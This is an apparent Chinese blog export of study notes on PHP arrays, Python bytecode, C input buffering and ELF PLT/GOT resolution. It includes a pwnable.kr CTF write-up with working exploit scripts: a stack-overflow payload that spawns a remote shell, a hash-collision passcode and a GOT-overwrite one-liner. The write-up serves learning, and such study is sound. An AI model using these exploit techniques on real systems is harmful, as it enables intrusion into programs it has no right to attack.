    <title><![CDATA[php-manual-note-0]]></title>
    <url>%2F2019%2F07%2F30%2Fphp-manual-note-0%2F</url>
    <content type="text"><![CDATA[php doc阅读笔记0 array 数组是php的key=&gt;value映射 key只能是integer和string类型，value可以是任意类型 所以key会有如下强制转换： 包含有合法整型值的字符串会被转换为整型。例如键名 &quot;8&quot; 实际会被储存为 8。但是 &quot;08&quot; 则不会强制转换，因为其不是一个合法的十进制数值。 浮点数也会被转换为整型，意味着其小数部分会被舍去。例如键名 8.7 实际会被储存为 8。 布尔值也会被转换成整型。即键名 true 实际会被储存为 1 而键名 false 会被储存为 0。 Null 会被转换为空字符串，即键名 null 实际会被储存为 &quot;&quot;。 数组和对象不能被用为键名。坚持这么做会导致警告：Illegal offset type。 比如官方举例如下： 123456789&lt;?php$array = array( 1 =&gt; "a", "1" =&gt; "b", 1.5 =&gt; "c", true =&gt; "d",);var_dump($array); 输出如下： 1234array(1) &#123; [1] =&gt; string(1) &quot;d&quot;&#125; 会导致数组的一部分值被覆盖掉 上例中所有的键名都被强制转换为 1，则每一个新单元都会覆盖前一个的值，最后剩下的只有一个 &quot;d&quot;。 同时： key 为可选项。如果未指定，PHP 将自动使用之前用过的最大 integer 键名加上 1 作为新的键名。 那就会有这种结果： 1234567$array = array( "a", "b",6 =&gt; "c", "d",);var_dump($array); 输出为： 12345678910array(4) &#123; [0] =&gt; string(1) &quot;a&quot; [1] =&gt; string(1) &quot;b&quot; [6] =&gt; string(1) &quot;c&quot; [7] =&gt; string(1) &quot;d&quot;&#125; 神奇的解引用语法 12345678910111213&lt;?phpfunction getArray()&#123; return array(1,2,3,4);&#125;//解引用语法$a = getArray()[0];var_dump($a);list(, $secondelement) = getArray();var_dump($secondelement); 输出为： 12int(1)int(2) list定义为：将数组中的值赋值给变量 用[]的语法 如果有一个数组 $arr = array(5 =&gt; 1, 12 =&gt; 2); 那么$arr[] = 56相当于$arr[13]=56 使用unset函数可以取消键值对映射比如unset($arr[5]),或者销毁一个数组unset($arr)]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python文档阅读笔记2]]></title>
    <url>%2F2019%2F07%2F30%2Fpython%E6%96%87%E6%A1%A3%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B02%2F</url>
    <content type="text"><![CDATA[fluent python reading notes 列表推导式 最常见的一种写法 123symboles = 'ABC%^&amp;*#@$'beyond_ascii = [ord(s) for s in symboles if ord(s) &gt; 40]print(beyond_ascii) 但是也可以同时用filter和map函数来实现 12beyond_ascii = list(filter(lambda x: x &gt; 40, map(ord, symboles)))print(beyond_ascii) map函数将一个函数作用于list中的每一个值上，filter也是对数组中的每一个值作用一个函数，但是只返回为真的数值，python3中最后返回的是一个filter对象 比如过滤列表中的所有奇数 1234# 过滤出列表中的所有奇数a = [1,242,45,23,536,1,325,63635,56335]a_is_odd = list(filter(lambda x: x % 2 != 0, a))print(a_is_odd) 再比如过滤出1~100中平方根是整数的数字 所谓整数就是能整除1的数字 1234#过滤出1~100中平方根是整数的数import mathg_is = list(filter(lambda x: math.sqrt(x) % 1 == 0, range(1, 101)))print(g_is) 解包 如下是一个比较神奇的栗子， 123456# python解包colors = ['black', 'white']sizes = ['S', 'M', 'L']for tshirt in ('%s %s' % (c, s) for c in colors for s in sizes): print(tshirt) 这里用一个%将元组进行了拆包 如何很好地理解列表推导式呢？ 你可以将其想象为一个函数，for c in colors for s in sizes 返回值是(c, s) 用一个%成功地对其进行了拆包转化为字符串形式 下面这幅图应该比较好理解 然后就有了返回值 当然还有这种写法： 1a, b, *rst = range(5) 陷阱 123t = (1,2, [30, 40])t[2] += [50, 60]print(t) 在一个不可变对象中插入了可变对象！ 虽然报错但是t的值确实被修改了 对其进行反汇编或者是反编译： 得到： 1234567891011121314151617183 0 LOAD_CONST 1 (1) 3 LOAD_CONST 2 (2) 6 LOAD_CONST 3 (30) 9 LOAD_CONST 4 (40) 12 BUILD_LIST 2 15 BUILD_TUPLE 3 18 STORE_FAST 0 (t) 4 21 LOAD_FAST 0 (t) 24 LOAD_CONST 2 (2) 27 DUP_TOP_TWO 28 BINARY_SUBSCR 29 LOAD_CONST 5 (50) 32 LOAD_CONST 6 (60) 35 BUILD_LIST 2 38 INPLACE_ADD 39 ROT_THREE 40 STORE_SUBSCR 作者提出的三个教训： 不要把可变对象放在元组里面 增量赋值不是一个原子操作 查看python的字节码并不难，而且了解代码背后的运行机制很有帮助 然后我们就来研究python的字节码 python字节码 变量 LOAD_FAST一般加载局部变量的值，也就是读取值，用于计算或者函数调用传参等。 STORE_FAST一般用于保存值到局部变量。 比如： 123461 77 LOAD_FAST 0 (n) 80 LOAD_FAST 3 (p) 83 INPLACE_DIVIDE 84 STORE_FAST 0 (n) INPLACE_DIVIDE就是原地除法，先加载n，然后加载p，然后除法，然后保存结果 对应的就是 n = n/p 如何区分函数形参和其他的局部变量？ 形参没有初始化，也就是从函数开始到LOAD_FAST该变量的位置，如果没有看到STORE_FAST，那么该变量就是函数形参。 123456789104 0 LOAD_CONST 1 (0) 3 STORE_FAST 1 (local1)5 6 LOAD_FAST 1 (local1) 9 PRINT_ITEM 10 LOAD_FAST 0 (arg1) 13 PRINT_ITEM 14 PRINT_NEWLINE 15 LOAD_CONST 0 (None) 18 RETURN_VALUE 这里arg1就没有STORE_FAST 所以对应的源代码为： 123def test(arg1): local1 = 0 print local1, arg1 全局变量 LOAD_GLOBAL用来加载全局变量，包括指定函数名，类名，模块名等全局符号。 12348 6 LOAD_CONST 2 (101) 9 STORE_GLOBAL 0 (global1) 20 LOAD_GLOBAL 0 (global1) 23 PRINT_ITEM 对应的python代码： 1234def test(): global global1 global1 = 101 print global1 常用数据类型 BUILD_LIST用于创建一个list结构。 如果是用列表推导式呢？ BUILD_MAP用于创建一个空的dict。STORE_MAP用于初始化dict的内容。 1234563 0 LOAD_CONST 1 ('a') 3 LOAD_CONST 2 ('1') 6 BUILD_MAP 1 9 STORE_FAST 0 (k) 12 LOAD_CONST 0 (None) 15 RETURN_VALUE 参考 死磕python字节码-手工还原python源码]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>python字节码</tag>
        <tag>tricks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C语言缓冲区]]></title>
    <url>%2F2019%2F07%2F30%2FC%E8%AF%AD%E8%A8%80%E7%BC%93%E5%86%B2%E5%8C%BA%2F</url>
    <content type="text"><![CDATA[调试一下c语言程序 自我感觉很久没写C语言了 getchar函数 1234567 char a = getchar();printf("a is %c\n", a);char b = getchar();printf("b is %c\n", b);char c = getchar();printf("c is %c\n", c);return 0; getchar函数是依次从缓冲区中取出字符来，会取走的！！ 1234nihaoa is nb is ic is h 这一行 12for (; scanf("%d", &amp;nums[i]) != 0 &amp;&amp; getchar() == ' '; ++i) nums = (int*)realloc(nums, sizeof(int) * (i + 1)); //数组为非降序排列 这里会要求用户输入数据，用户输入的数据就是会存放在缓冲区内，然后之后scanf每次读一个数字，getchar紧随其后读一个字符，所以我们输入的时候必须是一个数字一个空格 1while (getchar() == &apos;\n&apos; || getchar() == EOF || getchar() == &apos;\0&apos;); 之后把缓冲区的字符读干净 测试一下，如果我输入12 21\n 那么scanf读完21之后，getchar函数读\n 123456700D52466 je main+0DEh (0D524AEh) 00D52468 mov esi,esp 00D5246A call dword ptr [__imp__getchar (0D5F220h)] ;函数返回值存放在eax中，十进制10，代表LF00D52470 cmp esi,esp 00D52472 call __RTC_CheckEsp (0D51357h) 00D52477 cmp eax,20h 00D5247A jne main+0DEh (0D524AEh) 关键是这两条指令： 1200D52472 call __RTC_CheckEsp (0D51357h) 00D52477 cmp eax,20h 所以之后比较cmp eax 20h就会跳出循环 之后进入那个while循环 1234567while (getchar() == &apos;\n&apos; || getchar() == EOF || getchar() == &apos;\0&apos;);00D524AE mov esi,esp 00D524B0 call dword ptr [__imp__getchar (0D5F220h)] 00D524B6 cmp esi,esp 00D524B8 call __RTC_CheckEsp (0D51357h) 00D524BD cmp eax,0Ah 00D524C0 je main+119h (0D524E9h) 此时缓冲区已经是空的了，所以会要求用户继续输入数据 我此时输入了 1\n 所以调用完getchar函数之后eax存放了十六进制的49 那么第二个调用getchar读取的结果就是0Ah 1234500D524C2 mov esi,esp 00D524C4 call dword ptr [__imp__getchar (0D5F220h)] 00D524CA cmp esi,esp 00D524CC call __RTC_CheckEsp (0D51357h) 00D524D1 cmp eax,0FFFFFFFFh 继续。此时缓冲区已经空了 那么会要求用户继续输入 我又输入了一个换行符，很明显此时读取的结果非空，所以跳出while循环 12345600D524D8 call dword ptr [__imp__getchar (0D5F220h)] 00D524DE cmp esi,esp 00D524E0 call __RTC_CheckEsp (0D51357h) 00D524E5 test eax,eax ;检查eax是否为空00D524E7 jne main+11Bh (0D524EBh) 00D524E9 jmp main+0DEh (0D524AEh) 遇到的尴尬 如果要程序的健壮性，那么用户多输入一个空格就会出错，因为多输入一个空格程序就不知道后面那个是什么了，同时还涉及到getchar函数清空缓冲区，那个while循环的写法确实很经典，但是就没有考虑过如果缓冲区本身就是空的呢？ 我修改了一下原有的代码，加入了cin.peek函数来帮助判断 12345678910111213141516171819202122232425262728while (1)&#123; nums = (int*)realloc(nums, sizeof(int) * (i + 1)); scanf("%d", &amp;nums[i]); i++; char ch = getchar(); if (ch == ' ') &#123; if (isdigit(cin.peek())) &#123; continue; &#125; else &#123; break; &#125; &#125; if (ch == '\n') &#123; break; &#125;&#125;// for(;scanf("%d", &amp;nums[i]) != 0 &amp;&amp; getchar() == '\n'; i++)// &#123;// nums = (int *)realloc(nums, sizeof(int)*(i+1));// &#125;fflush(stdin);]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>缓冲区</tag>
        <tag>getchar</tag>
        <tag>x86</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[blog 更新小记]]></title>
    <url>%2F2019%2F07%2F30%2Fblog-%E6%9B%B4%E6%96%B0%E5%B0%8F%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[更新 简单地更新了一下自己的blog，虽然是这么说，但是实际上还是花了不少时间来完善，主要有： 修改了代码的高亮格式，黑色的主题更好看一些 更换了blog的markdown引擎，可以渲染emoj了 修改了自我介绍，去掉了网易云音乐的外链，因为失效了，同时添加了简书和知乎链接 添加了友链 添加了评论gitment TODO 搜索功能没有没法用 blog还可以更美化一点 一点感想 喜欢自己搭建的这个小天地，虽然有这么或者那么的不完善，但是这个blog见证着我的成长！]]></content>
      <categories>
        <category>config</category>
      </categories>
      <tags>
        <tag>blog</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[聊聊plt与got]]></title>
    <url>%2F2019%2F07%2F24%2F%E8%81%8A%E8%81%8Aplt%E4%B8%8Egot%2F</url>
    <content type="text"><![CDATA[深入理解plt和got 先写一段代码： 123456789// Build with: gcc -m32 --no-pie -g -o plt plt.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char **argv) &#123; puts("Hello world!"); exit(0);&#125; 途中遇到了一个报错： 1234In file included from /usr/include/stdio.h:27:0, from plt.c:3:/usr/include/features.h:374:25: fatal error: sys/cdefs.h: No such file or directory # include &lt;sys/cdefs.h&gt; 然后安装一个: apt install libc6-dev-i386 编译好程序之后 1234567$ checksec plt [*] &apos;/home/pxy/pwnable/plt&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 程序是没有pie的 readelf -S plt查看节表 12345[Nr] Name Type Addr Off Size ES Flg Lk Inf Al[12] .plt PROGBITS 08048300 000300 000050 04 AX 0 0 16[13] .text PROGBITS 08048350 000350 000192 00 AX 0 0 16[22] .got PROGBITS 08049ffc 000ffc 000004 04 WA 0 0 4[23] .got.plt PROGBITS 0804a000 001000 00001c 04 WA 0 0 4 可以看到： .plt 基地址为： 0x08048300 .got 基地址为： 0x08049ffc .got.plt 基地址为： 0x0x804a000 我们从调用puts函数那里开始单步执行 首先跳转到plt表中 120x804845d &lt;main+16&gt; call puts@plt &lt;0x8048310&gt;0x8048310 &lt;puts@plt&gt; jmp dword ptr [puts@got.plt] &lt;0x804a00c&gt; call puts之后，下一条指令也是一个跳转 jmp dword ptr [puts@got.plt] &lt;0x804a00c&gt; 这条指令的意思是取出puts@got.plt表中的值，放到pc寄存器中 所以？查看一下此处内存的值： 12pwndbg&gt; x/2x 0x804a00c0x804a00c &lt;puts@got.plt&gt;: 0x08048316 0x08048326 所以下一条指令的地址就是0x08048316还是在plt表中 12► 0x8048316 &lt;puts@plt+6&gt; push 0 0x804831b &lt;puts@plt+11&gt; jmp 0x8048300 这里先将0放到栈上，表明是要解析puts函数的地址，然后再跳转到0x8048300也就是plt表的开始部分 12► 0x8048300 push dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt; 0x8048306 jmp dword ptr [0x804a008] &lt;0xf7ff0650&gt; 这时候先把.got.plt表中的第二项放到栈上 先查看一下.got.plt中前三项的内容: 12pwndbg&gt; x/3x 0x804a0000x804a000: 0x08049f14 0xf7ffd938 0xf7ff0650 将0xf7ffd938放置到栈上，然后跳转到.got.plt中的第三项，也就是 0xf7ff0650，这个地址就是_dl_runtime_resolve函数的地址 负责解析函数的地址 此时我们的got表内容如下： 12345678pwndbg&gt; gotGOT protection: Partial RELRO | GOT functions: 4[0x804a00c] puts -&gt; 0x8048316 (puts@plt+6) ◂— push 0 /* &apos;h&apos; */[0x804a010] __gmon_start__ -&gt; 0x8048326 (__gmon_start__@plt+6) ◂— push 8[0x804a014] exit -&gt; 0x8048336 (exit@plt+6) ◂— push 0x10[0x804a018] __libc_start_main -&gt; 0xf7e26a00 (__libc_start_main) ◂— push ebp puts函数的地址还没有重定位 当我们执行过一遍puts函数之后 这时候回过头来继续查看got表中的内容： 12345678pwndbg&gt; gotGOT protection: Partial RELRO | GOT functions: 4[0x804a00c] puts -&gt; 0xf7e727e0 (puts) ◂— push ebp[0x804a010] __gmon_start__ -&gt; 0x8048326 (__gmon_start__@plt+6) ◂— push 8[0x804a014] exit -&gt; 0x8048336 (exit@plt+6) ◂— push 0x10[0x804a018] __libc_start_main -&gt; 0xf7e26a00 (__libc_start_main) ◂— push ebp 可以看到地址已经重定位好了 这和Windows的PE文件格式似乎有点不同了，PE文件是装载进内存之后函数地址都已经重定位好了，而Linux的elf文件刚刚装进内存之后函数的地址还是不确定的，需要在运行的时候进行重定位。 当我们将代码修改为如下时： 1234567891011pwndbg&gt; l 1, 20// Build with: gcc -m32 -no-pie -g -o plt plt.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char **argv) &#123; puts("Hello world!"); puts("hello world again !!!"); exit(0);&#125; 第一次调用puts函数之后： [0x804a00c] puts -&gt; 0xf7e727e0 (puts) ◂— push ebp puts函数地址已经重定位好了 接下来再次调用puts函数 123456► 0x8048310 &lt;puts@plt&gt; jmp dword ptr [0x804a00c] &lt;0xf7e727e0&gt; ↓ 0xf7e727e0 &lt;puts&gt; push ebp 0xf7e727e1 &lt;puts+1&gt; push edi 0xf7e727e2 &lt;puts+2&gt; push esi 0xf7e727e3 &lt;puts+3&gt; push ebx 此时可以看到直接就跳到函数的地址了 因为此时的.got.plt已经是puts函数的地址了， Linux tql 整理一下 之前看参考资料中博主的文章一直没有很理解，这里直接统一说一下我的理解： 何谓PLT与GOT 其实这里准确的来说应该叫got.plt而不是叫got，不过为了方便我们还是叫它got表吧 要注意那个jmp *printf@got *号是取出地址处的值，并不是跳到got表中去 延迟重定位 这篇文章我觉得写的很精彩 Linux为了缩减代码,就是按照这种模式来的： 12345678910void printf@plt()&#123;address_good: jmp *printf@got // 链接器将printf@got填成下一语句lookup_printf的地址lookup_printf: 调用重定位函数查找printf地址，并写到printf@got goto address_good;&#125; 也就和上面那张图是一一对应的 公共got表项 在解析函数的真正地址时， _dl_runtime_resolve是怎么知道它要解析哪个函数的 因为： 1234printf@plt&gt;: jmp *0x80496f8 push $0x00 jmp common@plt 这里push的值不一样，相当于就是每个函数取了一个id 之后就是公共got表的内容： got[0]: 本ELF动态段(.dynamic段）的装载地址 got[1]：本ELF的link_map数据结构描述符地址 got[2]：_dl_runtime_resolve函数的地址 穿针引线 PLT表中的第一项为公共表项，剩下的是每个动态库函数为一项（当然每项是由多条指令组成的，jmp *0xXXXXXXXX这条指令是所有plt的开始指令）每项PLT都从对应的GOT表项中读取目标函数地址 GOT表中前3个为特殊项，分别用于保存 .dynamic段地址、本镜像的link_map数据结构地址和_dl_runtime_resolve函数地址；但在编译时，无法获取知道link_map地址和_dl_runtime_resolve函数地址，所以编译时填零地址，进程启动时由动态链接器进行填充 参考 聊聊Linux动态链接中的PLT和GOT（１）——何谓PLT与GOT 聊聊Linux动态链接中的PLT和GOT（２）——延迟重定位 聊聊Linux动态链接中的PLT和GOT（３）——公共GOT表项 聊聊Linux动态链接中的PLT和GOT（4）—— 穿针引线 GOT and PLT for pwning.]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable]]></title>
    <url>%2F2019%2F07%2F24%2Fpwnable%2F</url>
    <content type="text"><![CDATA[pwnable从小白开始 pwnable是一个适合小白的网站 https://pwnable.kr/play.php fd 有源码： 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123; if(argc&lt;2)&#123; printf("pass argv[1] a number\n"); return 0; &#125; int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp("LETMEWIN\n", buf))&#123; printf("good job :)\n"); system("/bin/cat flag"); exit(0); &#125; printf("learn about Linux file IO\n"); return 0;&#125; 这道题目是让你了解Linux下的文件描述符 12345fd@prowl:~$ ./fd 4660LETMEWINgood job :)mommy! I think I know what a file descriptor is!!fd@prowl:~$ collision 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123; int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++)&#123; res += ip[i]; &#125; return res;&#125;int main(int argc, char* argv[])&#123; if(argc&lt;2)&#123; printf("usage : %s [passcode]\n", argv[0]); return 0; &#125; if(strlen(argv[1]) != 20)&#123; printf("passcode length should be 20 bytes\n"); return 0; &#125; if(hashcode == check_password( argv[1] ))&#123; system("/bin/cat flag"); return 0; &#125; else printf("wrong passcode.\n"); return 0;&#125; 果然我还是小白，连最基本的常识都不懂了，意识到了是由输入的argv[1]来计算的，20个字节正好分成5次，就是把每四个加起来就行了。 所以可以直接拿0x21DD09EC去除掉5就好了 exp如下： 1234567from pwn import *pwn_ssh=ssh(host='pwnable.kr',user='col',password='guest',port=2222)print(pwn_ssh.connected())sh=pwn_ssh.process(argv=['collision','\xc9\xce\xc5\x06'*4+'\xc8\xce\xc5\x06'],executable='./col')print(sh.recvall()) 这里还学到了一波用pwnssh连接的。 bof 源码： 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123; char overflowme[32]; printf("overflow me : "); gets(overflowme); // smash me! if(key == 0xcafebabe)&#123; system("/bin/sh"); &#125; else&#123; printf("Nah..\n"); &#125;&#125;int main(int argc, char* argv[])&#123; func(0xdeadbeef); return 0;&#125; 这是一个简单的栈溢出的题目 虽然简单，但是小白还是要仔细地分析一下的。 func对应的汇编代码，其实感觉汇编代码看的更明白一些： 12345678910111213141516171819202122.text:565D262C func proc near ; CODE XREF: main+10p.text:565D262C.text:565D262C s = byte ptr -2Ch.text:565D262C var_C = dword ptr -0Ch.text:565D262C arg_0 = dword ptr 8.text:565D262C.text:565D262C push ebp.text:565D262D mov ebp, esp.text:565D262F sub esp, 48h.text:565D2632 mov eax, large gs:14h ;gs保护机制.text:565D2638 mov [ebp+var_C], eax.text:565D263B xor eax, eax.text:565D263D mov dword ptr [esp], offset s ; &quot;overflow me : &quot;.text:565D2644 call near ptr puts+565D2649h.text:565D2649 lea eax, [ebp+s].text:565D264C mov [esp], eax ; s.text:565D264F call near ptr gets+565D2654h.text:565D2654 cmp [ebp+arg_0], 0CAFEBABEh.text:565D265B jnz short loc_565D266B.text:565D265D mov dword ptr [esp], offset command ; &quot;/bin/sh&quot;.text:565D2664 call near ptr system+565D2669h.text:565D2669 jmp short loc_565D2677 之前一直不太明白如果局部变量是数组该怎么搞 关键是这里： 12.text:565D2649 lea eax, [ebp+s].text:565D264C mov [esp], eax ; s 注意 lea eax, [ebp+s] 这里加了方括号但是其实还是地址，就是将字符串s的地址赋值给eax 然后再将其存放到栈顶，之后调用gets函数，将输入的值填入到缓冲区 从这张图就能明白内存的分布了 这道题目保护机制基本都开了，但是我们并不需要执行代码。只需要覆盖栈上的值就行了。也不会触发gs保护机制 exp如下： 12345678from pwn import *payload = 'A'*52+'\xbe\xba\xfe\xca'r=remote('pwnable.kr',9000)print(r.connected())r.sendline(payload)r.interactive() 运行效果如下： 12345678910111213pxy@ubuntu:~/pwnable$ python bofexp.py[+] Opening connection to pwnable.kr on port 9000: DoneTrue[*] Switching to interactive mode$ lsbofbof.cflagloglog2super.pl$ cat flagdaddy, I just pwned a buFFer :) flag 这道题目被upx加壳，Linux下的加壳倒还是第一次遇到。 到这里可以找到脱壳的工具 脱壳之后gdb载入，查看反汇编代码 1234567891011121314151617181920pwndbg&gt; disassemble mainDump of assembler code for function main: 0x0000000000401164 &lt;+0&gt;: push rbp 0x0000000000401165 &lt;+1&gt;: mov rbp,rsp 0x0000000000401168 &lt;+4&gt;: sub rsp,0x10 0x000000000040116c &lt;+8&gt;: mov edi,0x496658 0x0000000000401171 &lt;+13&gt;: call 0x402080 &lt;puts&gt; 0x0000000000401176 &lt;+18&gt;: mov edi,0x64 0x000000000040117b &lt;+23&gt;: call 0x4099d0 &lt;malloc&gt; 0x0000000000401180 &lt;+28&gt;: mov QWORD PTR [rbp-0x8],rax 0x0000000000401184 &lt;+32&gt;: mov rdx,QWORD PTR [rip+0x2c0ee5] # 0x6c2070 &lt;flag&gt; 0x000000000040118b &lt;+39&gt;: mov rax,QWORD PTR [rbp-0x8] 0x000000000040118f &lt;+43&gt;: mov rsi,rdx 0x0000000000401192 &lt;+46&gt;: mov rdi,rax 0x0000000000401195 &lt;+49&gt;: call 0x400320 0x000000000040119a &lt;+54&gt;: mov eax,0x0 0x000000000040119f &lt;+59&gt;: leave 0x00000000004011a0 &lt;+60&gt;: ret End of assembler dump.pwndbg&gt; b *0x0000000000401184 然后在此处下断点 123456789RAX 0x6c96b0 ◂— 0x0RBX 0x401ae0 (__libc_csu_fini) ◂— push rbxRCX 0x8RDX 0x496628 ◂— push rbp /* &apos;UPX...? sounds like a delivery service :)&apos; */RDI 0x4RSI 0x0R8 0x1R9 0x3R10 0x22 命中断点之后单步一次就行 这时候就看到寄存器的变化 flag就是那个拉2333 paascode 学到了一点从远程服务器下载东西的命令 $ scp -P 2222 passcode@pwnable.kr:/home/passcode/passcode . 源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344$ cat passcode.c #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123; int passcode1; int passcode2; printf("enter passcode1 : "); scanf("%d", passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf("enter passcode2 : "); scanf("%d", passcode2); printf("checking...\n"); if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123; printf("Login OK!\n"); system("/bin/cat flag"); &#125; else&#123; printf("Login Failed!\n"); exit(0); &#125;&#125;void welcome()&#123; char name[100]; printf("enter you name : "); scanf("%100s", name); printf("Welcome %s!\n", name);&#125;int main()&#123; printf("Toddler's Secure Login System 1.0 beta.\n"); welcome(); login(); // something after login... printf("Now I can safely trust you that you have credential :)\n"); return 0;&#125; 作为一名小白还是要好好地分析栈帧的构造 那要怎么分析程序呢？最关键的还是分析程序的交互过程，毕竟我们也是从程序的输入入手的。 12345 0x804862a &lt;welcome+33&gt; mov eax, 0x80487dd 0x804862f &lt;welcome+38&gt; lea edx, [ebp - 0x70]► 0x8048632 &lt;welcome+41&gt; mov dword ptr [esp + 4], edx 0x8048636 &lt;welcome+45&gt; mov dword ptr [esp], eax 0x8048639 &lt;welcome+48&gt; call __isoc99_scanf@plt &lt;0x80484a0&gt; 此处是调用scanf函数的过程， 先将一个地址0x80487dd赋值给eax寄存器，之后将ebp-0x70的地址传给edx寄存器，注意到这里的操作符是lea 之后再将edx寄存器的值放到栈的第二层，最后将eax寄存器的值放到栈顶。 所以调用scanf函数的时候，栈顶是0x80487dd，往下加4个字节存储的是一个局部变量开始的位置(就是字符串s的首地址) 123456 0x804862f &lt;welcome+38&gt; lea edx, [ebp - 0x70] 0x8048632 &lt;welcome+41&gt; mov dword ptr [esp + 4], edx 0x8048636 &lt;welcome+45&gt; mov dword ptr [esp], eax► 0x8048639 &lt;welcome+48&gt; call __isoc99_scanf@plt &lt;0x80484a0&gt; format: 0x80487dd ◂— &apos;%100s&apos; vararg: 0xff8e7068 ◂— 0x28 /* &apos;(&apos; */ 这是参数的传递过程 此时栈上的布局： 1200:0000│ esp 0xff8e7050 —▸ 0x80487dd ◂— and eax, 0x73303031 /* &apos;%100s&apos; */01:0004│ 0xff8e7054 —▸ 0xff8e7068 ◂— 0x28 /* &apos;(&apos; */ 这里有一点疑惑 直接查看内存 12pwndbg&gt; x/20x 0x80487dd0x80487dd: 0x30303125 0x30303125 其实就是%100的小端表示！！ 但是换一种方式看 123pwndbg&gt; x/20i 0x80487dd 0x80487dd: and eax,0x73303031 0x80487e2: add BYTE PTR [edi+0x65],dl 到底是数据还是指令全看程序员了 123456passcode@prowl:~$ python -c &quot;print &apos;A&apos;*96+&apos;\x04\xa0\x04\x08&apos;+str(0x080485d7)&quot; | ./passcodeToddler&apos;s Secure Login System 1.0 beta.enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�!enter passcode1 : Login OK!Sorry mom.. I got confused about scanf usage :(Now I can safely trust you that you have credential :) 不过这道题目我没有搞得很清楚]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python文档阅读笔记1]]></title>
    <url>%2F2019%2F07%2F24%2Fpython%E6%96%87%E6%A1%A3%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01%2F</url>
    <content type="text"><![CDATA[python 官方文档阅读 python可视化编程网站 循环 循环的问题 list类型是可变序列 12345words = ['cat', 'window', 'defenestrate']for w in words[:]: if len(w) &gt; 6: words.insert(0, w)print(words) 如果将上述代码的循环语句改为： for w in words: 那么这个循环就变成了死循环 原因是words这个list会被修改 同样的可以看这个： 12345basket = ['apple', 'orange', 'pear', 'orange', 'banana']for f in sorted(basket): print(f)print(basket) 在经过sorted函数之后，basket已经被修改了 可以看这个： &lt;iframe width=&quot;800&quot; height=&quot;500&quot; frameborder=&quot;0&quot; src=&quot;http://pythontutor.com/iframe-embed.html#code=basket%20%3D%20%5B'apple',%20'orange',%20'pear',%20'orange',%20'banana'%5D%0Afor%20f%20in%20sorted%28basket%29%3A%0A%20%20%20%20print%28f%29%0A&amp;codeDivHeight=400&amp;codeDivWidth=350&amp;cumulative=false&amp;curInstr=5&amp;heapPrimitives=nevernest&amp;origin=opt-frontend.js&amp;py=3&amp;rawInputLstJSON=%5B%5D&amp;textReferences=false&quot;&gt; &lt;/iframe&gt; 同样的list还有这样一个问题： 代码如下： 1234567def f(a, L=[]): L.append(a) return Lprint(f(1))print(f(2))print(f(3)) &lt;iframe width=&quot;800&quot; height=&quot;500&quot; frameborder=&quot;0&quot; src=&quot;http://pythontutor.com/iframe-embed.html#code=def%20f%28a,%20L%3D%5B%5D%29%3A%0A%20%20%20%20L.append%28a%29%0A%20%20%20%20return%20L%0A%0Aprint%28f%281%29%29%0Aprint%28f%282%29%29%0Aprint%28f%283%29%29&amp;codeDivHeight=400&amp;codeDivWidth=350&amp;cumulative=false&amp;curInstr=15&amp;heapPrimitives=nevernest&amp;origin=opt-frontend.js&amp;py=3&amp;rawInputLstJSON=%5B%5D&amp;textReferences=false&quot;&gt; &lt;/iframe&gt; 修改成这样就行： 12345def f(a, L = None): if L is None: L = [] L.append(a) return L 循环的tricks dict循环 123knights = &#123;'gallahad':'the pure', 'robin':'the brave'&#125;for key, value in knights.items(): print(key, value) list循环 12for index, value in enumerate(['tac', 'tic', 'toe']): print("index = &#123;&#125;, value = &#123;&#125;".format(index, value)) 两个list循环 12345questions = ['name', 'quest', 'favorite color']answers = ['lancelot', 'the holy grail', 'blue']for q,a in zip(questions, answers): print("what is your &#123;&#125;? It is &#123;&#125;".format(q, a)) 逆向循环 123# 逆向循环序列时，先正向，再调用reverse()函数for i in reversed(range(1, 10, 2)): print(i) 指定顺序循环，用sorted函数 参数的传递 之前还一直没明白python中**param这种传递形式的用法 这个栗子就很棒啦 123456789101112def cheeseshop(kind, *arguments, **keywords): print("-- Do you have any", kind, "?") print("-- I'm sorry, we're all out of", kind) for arg in arguments: print(arg) print("-" * 40) for kw in keywords: print(kw, ":", keywords[kw])cheeseshop("Limburger", "It's very runny, sir.", "It's really very, VERY runny, sir.",shopkeeper="Michael Palin", client="John Cleese", sketch="Cheese Shop Sketch") 